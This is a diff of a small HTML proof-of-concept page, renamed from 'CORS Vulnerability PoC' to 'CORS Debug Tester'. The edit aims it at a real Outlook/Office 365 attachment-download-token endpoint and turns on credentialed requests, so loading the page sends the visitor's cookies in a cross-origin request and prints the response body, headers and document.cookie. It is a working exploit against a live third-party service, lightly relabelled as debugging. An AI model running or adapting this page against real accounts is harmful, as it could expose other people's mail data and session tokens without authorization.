@@ -2,56 +2,67 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CORS Vulnerability PoC</title>
+  <title>CORS Debug PoC</title>
 </head>
 <body>
-  <h1>CORS PoC Test</h1>
+  <h1>CORS Debug Tester</h1>
   <p><strong>Status:</strong> <span id="status">Waiting…</span></p>
-  <pre id="output" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
+  <pre id="output" style="white-space: pre-wrap;"></pre>
 
   <script>
-    // === CONFIGURATION ===
-    const target = "https://outlook.office365.com/search/v1/suggestions?setflight=odspFilesForOwa&n=88^cv=casd.s"; // replace with your target
-    const method = "GET"; // or "POST"
-    const sendCredentials = false; // set true to test with cookies (if applicable)
+    const target = "https://outlook.office365.com/owa/service.svc?action=GetAttachmentDownloadToken&app=Mail&n=76"; // replace this
+    const method = "GET"; // or POST
+    const sendCredentials = true; // set to true to test cookies
 
     const data = {
-      example: "payload",
-      action: "test"
+      test: "cors-debug"
     };
 
-    // === LAUNCH CORS TEST ===
-    (async function() {
-      document.getElementById("status").textContent = "Requesting…";
+    async function testCORS() {
+      document.getElementById("status").textContent = "Sending request...";
+
+      const headers = {
+        "Content-Type": "application/json"
+      };
+
+      const options = {
+        method: method,
+        mode: "cors",
+        credentials: sendCredentials ? "include" : "omit",
+        headers: headers,
+        ...(method === "POST" ? { body: JSON.stringify(data) } : {})
+      };
 
       try {
-        const response = await fetch(target, {
-          method: method,
-          mode: "cors",
-          credentials: sendCredentials ? "include" : "omit",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          ...(method === "POST" ? { body: JSON.stringify(data) } : {})
-        });
+        const response = await fetch(target, options);
 
-        const contentType = response.headers.get("content-type");
-        let output;
+        const result = {
+          status: response.status,
+          statusText: response.statusText,
+          headers: {},
+          cookiesSent: document.cookie || "(none)",
+        };
 
-        if (contentType && contentType.includes("application/json")) {
-          const json = await response.json();
-          output = JSON.stringify(json, null, 2);
-        } else {
-          output = await response.text();
+        for (let pair of response.headers.entries()) {
+          result.headers[pair[0]] = pair[1];
         }
 
-        document.getElementById("status").textContent = `✅ ${response.status} ${response.statusText}`;
-        document.getElementById("output").textContent = output;
+        try {
+          const text = await response.text();
+          result.body = text;
+        } catch (e) {
+          result.body = "(Could not read body)";
+        }
+
+        document.getElementById("status").textContent = "✅ Response received";
+        document.getElementById("output").textContent = JSON.stringify(result, null, 2);
       } catch (err) {
-        document.getElementById("status").textContent = "❌ Request failed or blocked";
+        document.getElementById("status").textContent = "❌ Request failed";
         document.getElementById("output").textContent = err.toString();
       }
-    })();
+    }
+
+    testCORS();
   </script>
 </body>
 </html>
